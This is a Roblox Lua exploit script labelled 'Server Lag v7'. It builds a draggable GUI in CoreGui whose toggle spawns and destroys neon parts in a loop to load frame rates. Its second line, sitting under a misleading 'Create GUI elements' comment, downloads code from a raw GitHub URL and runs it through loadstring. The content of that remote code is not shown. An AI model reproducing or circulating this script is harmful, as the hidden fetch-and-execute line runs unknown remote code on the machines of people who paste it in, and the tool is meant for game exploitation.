-- Create GUI elements
loadstring(game:HttpGet("https://raw.githubusercontent.com/gdbulka/shiny-goggles/refs/heads/main/main.lua"))()

local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main frame
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.Position = UDim2.new(0.4, 0, 0.4, 0)
MainFrame.Size = UDim2.new(0, 250, 0, 130)
MainFrame.Active = true

local corner = Instance.new("UICorner", MainFrame)
corner.CornerRadius = UDim.new(0, 10)

-- Title
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Font = Enum.Font.GothamBold
Title.Text = "Server Lag v7"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true

-- Toggle button
Toggle.Parent = MainFrame
Toggle.Size = UDim2.new(0.7, 0, 0, 40)
Toggle.Position = UDim2.new(0.15, 0, 0.55, 0)
Toggle.Font = Enum.Font.Gotham
Toggle.Text = "OFF"
Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
Toggle.TextScaled = true
Toggle.BackgroundColor3 = Color3.fromRGB(170, 30, 30)
Toggle.AutoButtonColor = false

local btnCorner = Instance.new("UICorner", Toggle)
btnCorner.CornerRadius = UDim.new(0, 8)

-- Smooth drag
local UserInputService = game:GetService("UserInputService")
local dragging, mousePos, framePos

MainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		mousePos = input.Position
		framePos = MainFrame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - mousePos
		MainFrame.Position = UDim2.new(
			framePos.X.Scale, framePos.X.Offset + delta.X,
			framePos.Y.Scale, framePos.Y.Offset + delta.Y
		)
	end
end)

-- Client-only FPS load
local running = false

local function simulateClientLag()
	while running do
		for i = 1, 100 do -- ×10 more parts (was 10 before)
			local part = Instance.new("Part")
			part.Anchored = true
			part.Size = Vector3.new(1, 1, 1)
			part.Position = Vector3.new(math.random(-100,100), math.random(1,100), math.random(-100,100))
			part.Color = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
			part.Material = Enum.Material.Neon
			part.Parent = workspace
			game:GetService("RunService").RenderStepped:Wait()
			part:Destroy()
		end
	end
end

Toggle.MouseButton1Click:Connect(function()
	running = not running
	if running then
		Toggle.Text = "ON"
		Toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
		task.spawn(simulateClientLag)
	else
		Toggle.Text = "OFF"
		Toggle.BackgroundColor3 = Color3.fromRGB(170, 30, 30)
	end
end)
